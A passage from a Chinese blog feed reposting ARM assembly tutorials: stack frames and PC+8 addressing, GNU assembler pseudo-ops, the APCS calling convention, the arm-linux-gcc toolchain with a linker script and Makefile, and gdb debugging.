Frame）就是一个函数所在的栈的一部分，所有函数的栈帧串起来就组成了一个完整的栈。<br>栈帧的两个边界分别由 FP 和 SP 来限定，它们2个指向的是当前函数的栈帧。  </p><p>考虑 main 函数调用fun1函数的情形，下图是它们使用栈。<br>观察 func1 的栈帧，它的 SP 和 FP 之间指向的栈帧就是 main 函数的栈帧。<br>main 函数产生调用时，PC、LR、SP、FP 会在第一时间压栈。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242323934.png"></p><h2 id="4-PC与相对取址"><a href="#4-PC与相对取址" class="headerlink" title="4. PC与相对取址"></a>4. PC与相对取址</h2><p>ARM 不能像单片机那样，想取某个标签地址，就可以 mov r1,#标签。<br>因为ARM立即数寻址有限制，最大是4096，再大就只能相对寻址，显然所有的指针都会超过限制，只能间接寻址，所以需要用另一种方式直接算出寻址位置的地址和全局变量位置的相对地址。  </p><p><strong>ARM7和ARM9都是3级流水线</strong>，取指，译指，执行时同时执行的：   </p><ol><li>Fetch（从存储器装载一条指令）   </li><li>Decode（识别将要被执行的指令）   </li><li>Execute（处理指令并将结果写回寄存器）</li></ol><p><strong>而R15（PC）总是指向“正在取指”指令，而不是指向“正在执行”的指令或正在“译码”的指令</strong>，那么CPU正在译指的指令地址是PC-4（当ARM状态时，每条指令为4字节），CPU正在执行的指令地址是PC-8，也就是说PC所指向的地址和现在所执行的指令地址相差8，即：PC实际值&#x3D;当前程序执行位置+8。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242324676.png"><br>PC（execute）&#x3D;PC（fetch）+ 8<br>对于PC&#x3D;PC+8中的两个PC，其实含义不完全一样。其更准确的表达，应该是这样：<br>其中：<br>PC（fetch）：当前正在执行的指令，就是之前取该指令时候的PC的值。<br>PC（execute）：当前指令执行的计算中，如果用到PC，则此时PC的值。   </p><p>不同阶段的PC值的关系<br>对应地，在ARM7的三级流水线（取指，译指，执行）和ARM9的五级流水线（取指，译指，执行，存储，写回）中，可以这么说：<br>PC， 总是指向当前正在被取指的指令的地址，<br>PC-4，总是指向当前正在被译指的指令的地址，<br>PC-8，总是指向当前的那条指令，即我们一般说的，正在被执行的指令的地址。  </p><p>其他细节具体可参考 <a href="http://www.crifan.com/files/doc/docbook/uboot_starts_analysis/release/htmls/why_arm7_pc_8.html">3.4. 为何ARM7中PC&#x3D;PC+8</a>  </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.coranac.com/tonc/text/asm.htm">Whirlwind Tour of ARM Assembly</a><br><a href="https://www.scss.tcd.ie/~waldroj/3d1/arm_arm.pdf">ARM Architecture Reference Manual</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/JnuSimba/AndroidSecNotes/blob/master/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/ARM%20%E5%AF%84%E5%AD%98%E5%99%A8%E7%AE%80%E4%BB%8B.md">https://github.com/JnuSimba/AndroidSecNotes/blob/master/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/ARM%20%E5%AF%84%E5%AD%98%E5%99%A8%E7%AE%80%E4%BB%8B.md</a></p>]]></content>
    
    
    <categories>
      
      <category>arm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARM汇编伪指令简介</title>
    <link href="/2023/12/22/ARM%20%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/12/22/ARM%20%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>arm架构的伪汇编指令</p><span id="more"></span><h1 id="第一部分-Linux下ARM汇编语法"><a href="#第一部分-Linux下ARM汇编语法" class="headerlink" title="第一部分 Linux下ARM汇编语法"></a>第一部分 Linux下ARM汇编语法</h1><p>尽管在Linux下使用C或C++编写程序很方便，但汇编源程序用于系统最基本的初始化，如初始化堆栈指针、设置页表、操作 ARM的协处理器等，初始化完成后就可以跳转到C代码执行。需要注意的是，GNU的汇编器遵循AT&amp;T的汇编语法，指令一般用小写字母，可以从GNU的站点（<a href="http://www.gnu.org/">www.gnu.org</a> ）上下载有关规范。<br>（汇编）指令是CPU机器指令的助记符，经过编译后会得到一串10组成的机器码，可以由CPU读取执行。<br>（汇编）伪指令本质上不是指令（只是和指令一起写在代码中），它是编译器环境提供的，目的是用来指导编译过程，经过编译后伪指令最终不会生成机器码。  </p><h2 id="一-Linux汇编行结构"><a href="#一-Linux汇编行结构" class="headerlink" title="一. Linux汇编行结构"></a>一. Linux汇编行结构</h2><p>任何汇编行都是如下结构：<br>[:] [} @ comment<br>[:] [} @ 注释<br>Linux ARM 汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。<br>【例1】定义一个”add”的函数，返回两个参数的和。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">.section .text, &quot;x&quot;<br>.global add @ give the symbol add external linkage<br>add:<br>ADD r0, r0, r1 @ add input arguments<br>MOV pc, lr @ return from subroutine<br>@ end of program<br></code></pre></td></tr></table></figure><h2 id="二-Linux-汇编程序中的标号"><a href="#二-Linux-汇编程序中的标号" class="headerlink" title="二. Linux 汇编程序中的标号"></a>二. Linux 汇编程序中的标号</h2><p>标号只能由a～z，A～Z，0～9，”.”，_等字符组成。当标号为0～9的数字时为局部标号，局部标号可以重复出现，使用方法如下：<br>标号f: 在引用的地方向前的标号<br>标号b: 在引用的地方向后的标号<br>【例2】使用局部符号的例子，一段循环程序  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">1:<br>  subs r0,r0,#1 @每次循环使r0=r0-1<br>  bne 1f @跳转到1标号去执行<br></code></pre></td></tr></table></figure><p>局部标号代表它所在的地址，因此也可以当作变量或者函数来使用。  </p><h2 id="三-Linux汇编程序中的分段"><a href="#三-Linux汇编程序中的分段" class="headerlink" title="三. Linux汇编程序中的分段"></a>三. Linux汇编程序中的分段</h2><p>（1）.section伪操作<br>用户可以通过.section伪操作来自定义一个段，格式如下:<br> <code>.section section_name [, &quot;flags&quot;[, %type[,flag_specific_arguments]]]</code><br>每一个段以段名为开始，以下一个段名或者文件结尾为结束。这些段都有缺省的标志(flags)，连接器可以识别这些标志。(与armasm中的AREA相同)。<br>type可以是 @progbits(节中包含数据)，@nobits(节中不含数据，只是占位空间)，@note(节中包含注释信息，不是程序)。<br>下面是ELF格式允许的段标志<br>&lt;标志&gt; 含义<br>a 允许段<br>w 可写段<br>x 执行段<br>【例3】定义段  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.section .mysection @自定义数据段，段名为 &quot;.mysection&quot;<br>.align 2<br>strtemp:<br>.ascii &quot;Temp string /n/0&quot;<br></code></pre></td></tr></table></figure><p>（2）汇编系统预定义的段名<br>.text @代码段<br>.data @初始化数据段<br>.bss @未初始化数据段<br>.sdata @<br>.sbss @<br>需要注意的是，源程序中.bss段应该在.text之前。  </p><h2 id="四-定义入口点"><a href="#四-定义入口点" class="headerlink" title="四. 定义入口点"></a>四. 定义入口点</h2><p>汇编程序的缺省入口是 start标号，用户也可以在连接脚本文件中用ENTRY标志指明其它入口点。<br>【例4】定义入口点  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">.section.data<br>&lt; initialized data here&gt;<br>.section .bss<br>&lt; uninitialized data here&gt;<br>.section .text<br>.globl _start<br>_start:<br>&lt;instruction code goes here&gt;<br></code></pre></td></tr></table></figure><h2 id="五-Linux汇编程序中的宏定义"><a href="#五-Linux汇编程序中的宏定义" class="headerlink" title="五. Linux汇编程序中的宏定义"></a>五. Linux汇编程序中的宏定义</h2><p>格式如下:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.macro 宏名 参数名列表 @伪指令.macro定义一个宏<br> 宏体<br>.endm @.endm表示宏结束<br></code></pre></td></tr></table></figure><p>如果宏使用参数，那么在宏体中使用该参数时添加前缀”&#x2F;“，宏定义时的参数还可以使用默认值，可以使用.exitm伪指令来退出宏。<br>【例5】宏定义  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.macro SHIFTLEFT a, b<br>.if /b &lt; 0<br>MOV /a, /a, ASR #-/b<br>.exitm<br>.endif<br>MOV /a, /a, LSL #/b<br>.endm<br></code></pre></td></tr></table></figure><h2 id="六-Linux汇编程序中的常数"><a href="#六-Linux汇编程序中的常数" class="headerlink" title="六. Linux汇编程序中的常数"></a>六. Linux汇编程序中的常数</h2><p>（1）十进制数以非0数字开头，如：123和9876；<br>（2）二进制数以0b开头，其中字母也可以为大写；<br>（3）八进制数以0开始，如：0456,0123；<br>（4）十六进制数以0x开头，如：0xabcd,0X123f；<br>（5）字符串常量需要用引号括起来，中间也可以使用转义字符，如: “You are welcome!&#x2F;n”；<br>（6）当前地址以”.”表示，在汇编程序中可以使用这个符号代表当前指令的地址；<br>（7）表达式：在汇编程序中的表达式可以使用常数或者数值，”-“表示取负数，”~”表示取补，”&lt;&gt;”表示不相等，其他的符号如：+、-、*、 &#x2F;、%、&lt;、&lt;&lt;、&gt;、&gt;&gt;、|、&amp;、^、!、&#x3D;&#x3D;、&gt;&#x3D;、&lt;&#x3D;、&amp;&amp;、|| 跟C语言中的用法相似。    </p><h2 id="七-Linux下ARM汇编的常用伪操作"><a href="#七-Linux下ARM汇编的常用伪操作" class="headerlink" title="七. Linux下ARM汇编的常用伪操作"></a>七. Linux下ARM汇编的常用伪操作</h2><p>在前面已经提到过了一些伪操作，还有下面一些伪操作：<br>数据定义伪操作： .byte，.short，.long，.quad，.float，.string&#x2F;.asciz&#x2F;.ascii；<br>重复定义伪操作.rept；<br>赋值语句.equ&#x2F;.set ；<br>函数的定义 ；<br>对齐方式伪操作 .align；<br>源文件结束伪操作.end；<br>.include 伪操作；<br>if 伪操作；<br>.global&#x2F; .globl 伪操作 ；<br>.type伪操作 ；<br>列表控制语句 ；<br>.abort 停止汇编；<br>区别于gas汇编的通用伪操作，下面是ARM特有的伪操作   ：.reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool  </p><ol><li><p>数据定义伪操作<br>（1） .byte：单字节定义，如：<code>.byte 1,2,0b01,0x34,072,&#39;s&#39;</code> ；<br>（2） .short：定义双字节数据，如：<code>.short 0x1234,60000</code> ；<br>（3） .long：定义4字节数据，如：<code>.long 0x12345678,23876565</code>；<br>（4） .quad：定义8字节，如：<code>.quad 0x1234567890abcd</code>；<br>（5） .float：定义浮点数，如：<br>  <code>.float 0f-314159265358979323846264338327/95028841971.693993751E-40 @ -pi</code><br>（6） .string&#x2F;.asciz&#x2F;.ascii：定义多个字符串，如:   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">  .string &quot;abcd&quot;, &quot;efgh&quot;, &quot;hello!&quot;    <br>  .asciz &quot;qwer&quot;, &quot;sun&quot;, &quot;world!&quot;    <br>  .ascii &quot;welcome/0&quot;<br>```    <br>需要注意的是：.ascii伪操作定义的字符串需要自行添加结尾字符&#x27;/0&#x27;。  <br>（7） .rept： 重复定义伪操作，格式如下:  <br>  .rept 重复次数  <br>  数据定义  <br>  .endr @结束重复定义  <br>  例如:  <br>``` asm<br>  .rept 3<br>  .byte 0x23<br>  .endr<br></code></pre></td></tr></table></figure><p>（8） .equ&#x2F;.set：赋值语句, 格式如下:<br>  .equ(.set) 变量名,表达式<br>  例如:<br>  <code>.equ abc, 3 @让abc=3</code><br> (9) <code>.comm  symbol, length</code>：在bss段申请一段命名空间，该段空间的名称叫symbol, 长度为length，Ld连接器在连接会为它留出空间。<br> (10) <code>.previous</code>：将当前节换回到前一个节与子节，即将下面的指令或数据汇编到当前节之前使用的节与子节中。<br> (11) <code>.subsection num</code>：切换当前子节，即将下面的代码或数据放在由num指定的子节中，节保持不变。<br> (12) <code>.fill repeat,size,value</code>：将value值拷贝repeat次，其中每个value中占用size字节。<br> (13)space 和 skip<br>  <code>.space size,fill</code> 和<code>.skip size,fill</code>： 在目标文件的当前位置处留出size字节的空间，并在其中填入值fill，如未指定fill，则填入0。<br> (14)<code>.org new-lc,fill</code>： 从new-lc标识的新位置开始存放下边的代码或数据，之前空出来的空间用fill填充。<br> (15) <code>.extern symbol</code>： 从其它模块引入符号，类似C中的extern。    </p></li><li><p>函数的定义伪操作<br>（1）函数的定义,格式如下：<br>  函数名:<br>  函数体<br>  返回语句<br>一般的，函数如果需要在其他文件中调用，需要用到.global 伪操作将函数声明为全局函数。为了不至于在其他程序在调用某个C函数时发生混乱，对寄存器的使用我们需要遵循APCS准则，函数编译器将处理为函数代码为一段.global的汇编码。<br>（2）函数的编写应当遵循如下规则:</p></li></ol><ul><li>a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的；  </li><li>如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中；  </li><li>如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中；  </li><li>如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7，那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。</li></ul><ol start="3"><li>.align .end .include .incbin 伪操作<br>（1）.align:用来指定数据的对齐方式，格式如下:<br>  <code>.align [absexpr1, absexpr2]</code><br> 以某种对齐方式，在未使用的存储区域填充值。第一个值表示对齐方式：4,8,16或 32，第二个表达式值表示填充的值。<br>（2）.end：表明源文件的结束。<br>（3）.include：可以将指定的文件在使用.include 的地方展开，一般是头文件，例如:<br>  <code>.include &quot;myarmasm.h&quot;</code><br>（4）.incbin 伪操作可以将原封不动的一个二进制文件编译到当前文件中，使用方法如下：<br>  <code>.incbin &quot;file&quot;[,skip[,count]]</code><br>  skip表明是从文件开始跳过skip个字节开始读取文件，count是读取的字数。  </li><li>.if 伪操作<br>根据一个表达式的值来决定是否要编译下面的代码，用.endif伪操作来表示条件判断的结束，中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。<br>.if有多个变种：  <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">.ifdef symbol @判断symbol是否定义<br>.ifc string1,string2 @字符串string1和string2是否相等，字符串可以用单引号括起来<br>.ifeq <span class="hljs-keyword">expression</span> @判断<span class="hljs-keyword">expression</span>的值是否为<span class="hljs-number">0</span><br>.ifeqs string1,string2 @判断string1和string2是否相等，字符串必须用双引号括起来<br>.ifge <span class="hljs-keyword">expression</span> @判断<span class="hljs-keyword">expression</span>的值是否大于等于<span class="hljs-number">0</span><br>.ifgt absolute <span class="hljs-keyword">expression</span> @判断<span class="hljs-keyword">expression</span>的值是否大于<span class="hljs-number">0</span><br>.ifle <span class="hljs-keyword">expression</span> @判断<span class="hljs-keyword">expression</span>的值是否小于等于<span class="hljs-number">0</span><br>.iflt absolute <span class="hljs-keyword">expression</span> @判断<span class="hljs-keyword">expression</span>的值是否小于<span class="hljs-number">0</span><br>.ifnc string1,string2 @判断string1和string2是否不相等，其用法跟.ifc恰好相反。<br>.ifndef symbol, .ifnotdef symbol @判断是否没有定义symbol，跟.ifdef恰好相反<br>.ifne <span class="hljs-keyword">expression</span> @如果<span class="hljs-keyword">expression</span>的值不是<span class="hljs-number">0</span>，那么编译器将编译下面的代码<br>.ifnes string1,string2 @如果字符串string1和string2不相等，那么编译器将编译下面的代码.<br></code></pre></td></tr></table></figure></li><li>.global .type .title .list<br>（1）.global&#x2F; .globl ：用来定义一个全局的符号，格式如下:<br>  <code>.global symbol</code> 或者 <code>.globl symbol</code><br>（2）.type：用来指定一个符号的类型是函数类型或者是对象类型，对象类型一般是数据，格式如下:<br>  .type 符号，类型描述<br>【例6】  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.globl a<br>.data<br>.align 4<br>.type a, @object<br>.size a, 4<br>a:<br>.long 10<br></code></pre></td></tr></table></figure>【例7】  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.section .text<br>.type asmfunc, @function<br>.globl asmfunc<br>asmfunc:<br>mov pc, lr<br></code></pre></td></tr></table></figure>（3）列表控制语句:<br>.title：用来指定汇编列表的标题，例如:<br>  <code>.title &quot;my program&quot;</code><br>.list：用来输出列表文件。  </li><li>ARM 特有的伪操作<br>（1） .reg: 用来给寄存器赋予别名，格式如下:<br>别名 .req 寄存器名<br>（2） .unreq: 用来取消一个寄存器的别名，格式如下:<br>　　.unreq 寄存器别名<br>　注意被取消的别名必须事先定义过，否则编译器就会报错，这个伪操作也可以用来取消系统预制的别名，例如r0，但如果没有必要的话不推荐那样做。<br>（3） .code伪操作用来选择ARM或者Thumb指令集，格式如下:<br>　　.code 表达式<br>　　如果表达式的值为16则表明下面的指令为Thumb指令，如果表达式的值为32则表明下面的指令为ARM指令。<br>（4） .thumb 伪操作等同于.code 16，表明使用Thumb指令，类似的.arm 等同于.code 32<br>（5） .force_thumb 伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持<br>（6） .thumb_func 伪操作用来指明一个函数是thumb指令集的函数<br>（7） .thumb_set 伪操作的作用类似于.set，可以用来给一个标志起一个别名， 比.set 功能增加的一点是可以把一个标志标记为thumb 函数的入口， 这点功能等同于 .thumb_func<br>（8） .ltorg 用于声明一个数据缓冲池(literal pool)的开始，它可以分配很大的空间。<br>（9） .pool 的作用等同 .ltorg<br>（9）.space <number_of_bytes> {,<fill_byte>}<br>分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同）<br>（10）.word <word1> {,<word2>} …<br>插入一个32-bit的数据队列。（与armasm中的DCD功能相同）<br>可以使用.word把标识符作为常量使用<br>例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">Start:<br>valueOfStart:<br>.word Start<br></code></pre></td></tr></table></figure>这样程序的开头Start便被存入了内存变量valueOfStart中。<br>（11）.hword <short1> {,<short2>} …<br>插入一个16-bit的数据队列。（与armasm中的DCW相同）</li></ol><h2 id="八-GNU-ARM汇编特殊字符和语法"><a href="#八-GNU-ARM汇编特殊字符和语法" class="headerlink" title="八. GNU ARM汇编特殊字符和语法"></a>八. GNU ARM汇编特殊字符和语法</h2><p>代码行中的注释符号: ‘@’<br>整行注释符号: ‘#’<br>语句分离符号: ‘;’<br>直接操作数前缀: ‘#’ 或 ‘$’  </p><h1 id="第二部分-GNU的编译器和调试工具"><a href="#第二部分-GNU的编译器和调试工具" class="headerlink" title="第二部分 GNU的编译器和调试工具"></a>第二部分 GNU的编译器和调试工具</h1><h2 id="一-APCS规则"><a href="#一-APCS规则" class="headerlink" title="一.APCS规则"></a>一.APCS规则</h2><p>APCS(ARM Process Call Standard)也就是指过程调用规则，定义了一系列规则来保证ARM汇编语言和C程序之间能够协调工作。涉及到的函数参数传递问题，返回值传递以及和函数调用过程中的寄存器的使用，堆栈的使用等问题。  </p><ol><li>寄存器使用<br>  APCS中，R0-R3用来传递参数，传递参数给子程序和返回子程序结果；R4-R11保存函数的局部变量（Thumb指令集只能使用R4-R7），R12（IP）也能被用在子程序间传递立即数（ARM状态下）；<br>R13(SP)用来做堆栈指针，保存当前处理器模式的栈顶指针，链接寄存器R14（LR）保存子程序的返回过程。  </li><li>参数传递规则<br>当参数个数不超过4个时，可用上述的4个寄存器来传递，否则超过的参数使用栈来传递，对于子程序的返回结果，可用R0-R3来传递。  </li><li>函数的返回值<br>若返回值是32位的整数时，一般通过寄存器R0来传递，如果是64位的整数时，用R0和R1来传递。  </li><li>arm-linux-gcc编译器<br>1&gt;.预处理：将预处理输入文件后缀名为”.c”,”.S”，输出为”.i”，工具：arm-linux-cpp<br><code>arm-linux-gcc -E -o *.i  *.c/*.S</code><br>2&gt;.编译：完成源代码从高级语言到特定的汇编语言代码的转换工具：ccl<br><code>arm-linux-gcc -S -o *.s *c</code><br>3&gt;.汇编：将编译得到的”.s”文件按照一定的指令集转换成一定格式的机器码工具：arm-linux-as<br><code>arm-linux-gcc -c -o *.o  *.c/*s/*.S</code><br>4&gt;.链接：将汇编生成的目标文件和系统库的目标文件，库文件组装起来，生成在特定处理器平台运行的可执行文件，工具：arm-linux-ld<br><code>arm-linux-gcc -o *.c/*s/*S</code><br>除了上面的-E， -S， -c, -o选项外，还有-v,-g,-Wall,-Ox,（x&#x3D;1,2,3…）等选项</li></ol><h2 id="二-编译工具"><a href="#二-编译工具" class="headerlink" title="二. 编译工具"></a>二. 编译工具</h2><ol><li>编辑工具介绍<br>GNU 提供的编译工具包括汇编器as、C编译器gcc、C++编译器g++、连接器ld和二进制转换工具objcopy。基于ARM平台的工具分别为arm-linux-as、arm-linux-gcc、arm-linux-g++、arm-linux-ld和arm-linux-objcopy。<br>GNU的编译器功能非常强大，共有上百个操作选项，这也是这类工具让初学者头痛的原因。不过，实际开发中只需要用到有限的几个，大部分可以采用缺省选项。GNU工具的开发流程如下：编写C、C++语言或汇编源程序，用gcc或g++生成目标文件，编写连接脚本文件，用连接器生成最终目标文件（elf格式），用二进制转换工具生成可下载的二进制代码。<br>（1）编写C、C++语言或汇编源程序<br>通常汇编源程序用于系统最基本的初始化，如初始化堆栈指针、设置页表、操作ARM的协处理器等。初始化完成后就可以跳转到C代码执行。需要注意的是，GNU的汇编器遵循AT&amp;T的汇编语法，读者可以从GNU的站点（<a href="http://www.gnu.org/">www.gnu.org</a> ）上下载有关规范。汇编程序的缺省入口是 start标号，用户也可以在连接脚本文件中用ENTRY标志指明其它入口点（见下文关于连接脚本的说明）。<br>（2）用gcc或g++生成目标文件<br>如果应用程序包括多个文件，就需要进行分别编译，最后用连接器连接起来。如笔者的引导程序包括3个文件：init.s（汇编代码、初始化硬件）xmrecever.c（通信模块，采用Xmode协议）和flash.c（Flash擦写模块）。<br>分别用如下命令生成目标文件：<br><code>arm-linux-gcc-c-O2-oinit.oinit.s</code><br><code>arm-linux-gcc-c-O2-oxmrecever.oxmrecever.c</code><br><code>arm-linux-gcc-c-O2-oflash.oflash.c</code><br>其中-c 命令表示只生成目标代码，不进行连接；-o 命令指明目标文件的名称；-O2表示采用二级优化，采用优化后可使生成的代码更短，运行速度更快。如果项目包含很多文件，则需要编写makefile文件。关于makefile的内容，请感兴趣的读者参考相关资料。<br>（3）编写连接脚本文件<br>gcc 等编译器内置有缺省的连接脚本。如果采用缺省脚本，则生成的目标代码需要操作系统才能加载运行。为了能在嵌入式系统上直接运行，需要编写自己的连接脚本文件。编写连接脚本，首先要对目标文件的格式有一定了解。<br>GNU编译器生成的目标文件缺省为elf格式。elf文件由若干段（section）组成，如不特殊指明，由C源程序生成的目标代码中包含如下段：.text（正文段）包含程序的指令代码；.data(数据段)包含固定的数据，如常量、字符串；.bss（未初始化数据段）包含未初始化的变量、数组等。<br>C++源程序生成的目标代码中还包括.fini（析构函数代码）和 .init（构造函数代码）等。连接器的任务就是将多个目标文件的.text、.data和.bss等段连接在一起，而连接脚本文件是告诉连接器从什么地址开始放置这些段。<br>例如连接文件link.lds为：  <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ENTRY<span class="hljs-params">(begin)</span><br>SECTION<br>&#123;<br><span class="hljs-string">.=0x30000000</span>;<br><span class="hljs-string">.text</span>:&#123;*<span class="hljs-params">(.text)</span>&#125;<br><span class="hljs-string">.data</span>:&#123;*<span class="hljs-params">(.data)</span>&#125;<br><span class="hljs-string">.bss</span>:&#123;*<span class="hljs-params">(.bss)</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>其中，ENTRY(begin)指明程序的入口点为begin标号；.&#x3D;0x00300000 指明目标代码的起始地址为0x30000000，这一段地址为 MX1的片内RAM；<code>.text:&#123;*(.text)&#125;</code> 表示从0x30000000 开始放置所有目标文件的代码段，随后的<code>.data:&#123;* (.data)&#125;</code> 表示数据段从代码段的末尾开始，再后是.bss段。<br>（4）用连接器生成最终目标文件<br>有了连接脚本文件，如下命令可生成最终的目标文件：<br><code>arm-linux-ld –no stadlib –o bootstrap.elf -Tlink.lds init.o xmrecever.o flash.o</code><br>其中，ostadlib表示不连接系统的运行库，而是直接从begin入口；-o指明目标文件的名称；-T指明采用的连接脚本文件（也可以使用-Ttext address，address表示执行区地址）；最后是需要连接的目标文件列表。<br>（5）生成二进制代码<br>连接生成的elf文件还不能直接下载执行，通过objcopy工具可生成最终的二进制文件：<br><code>arm-linux-objcopy –O binary bootstrap.elf bootstrap.bin</code><br>其中-O binary指定生成为二进制格式文件。Objcopy还可以生成S格式的文件，只需将参数换成-O srec。还可以使用-S 选项，移除所有的符号信息及重定位信息。如果想将生成的目标代码反汇编，还可以用objdump工具：<br><code>arm-linux-objdump -D bootstrap.elf</code><br>至此，所生成的目标文件就可以直接写入Flash中运行了。  </li><li>Makefile实例  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">example: head.s main.c</span><br> arm-linux-gcc -c -o head.o head.s<br> arm-linux-gcc -c -o main.o main.c<br> arm-linux-ld -Tlink.lds head.o ain.o -o example.elf<br> arm-linux-objcopy -O binary -S example_tmp.o example<br> arm-linux-objdump -D -b binary -m arm example &gt;ttt.s<br></code></pre></td></tr></table></figure></li></ol><h2 id="三-调试工具"><a href="#三-调试工具" class="headerlink" title="三. 调试工具"></a>三. 调试工具</h2><p>Linux 下的GNU调试工具主要是gdb、gdbserver和kgdb。其中gdb和gdbserver可完成对目标板上Linux下应用程序的远程调试。 gdbserver是一个很小的应用程序，运行于目标板上，可监控被调试进程的运行，并通过串口与上位机上的gdb通信。开发者可以通过上位机的gdb输入命令，控制目标板上进程的运行，查看内存和寄存器的内容。gdb5.1.1以后的版本加入了对ARM处理器的支持，在初始化时加入 –target&#x3D;arm 参数可直接生成基于ARM平台的gdbserver。gdb工具可以从 <a href="ftp://ftp.gnu.org/pub/gnu/gdb/">ftp://ftp.gnu.org/pub/gnu/gdb/</a> 上下载。<br>对于Linux内核的调试，可以采用kgdb工具，同样需要通过串口与上位机上的gdb通信，对目标板的Linux内核进行调试。可以从 <a href="http://oss.sgi.com/projects/kgdb/">http://oss.sgi.com/projects/kgdb/</a> 上了解具体的使用方法。  </p>]]></content>
    
    
    <categories>
      
      <category>arm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARM汇编指令简介</title>
    <link href="/2023/12/22/ARM%20%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/12/22/ARM%20%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B/</url>
    
